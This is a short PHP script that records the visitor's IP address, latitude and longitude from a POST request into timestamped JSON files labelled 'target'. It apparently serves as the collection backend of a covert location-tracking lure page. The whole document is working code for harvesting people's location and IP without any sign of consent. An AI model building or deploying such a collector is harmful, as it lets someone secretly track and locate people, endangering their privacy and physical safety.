<?php
$lat = $_POST['lat'];
$long = $_POST['long'];
$target_ip=$_SERVER['REMOTE_ADDR'];
$new_location = fopen("locations/target_at".date('(M-d-Y|h:i:s)',time()).".json", "w");
$data=array("target_ip"=>$target_ip,"latitude"=>$lat,"longitude"=>$long);
$location=json_encode($data);
fwrite($new_location, $location);
fclose($new_location);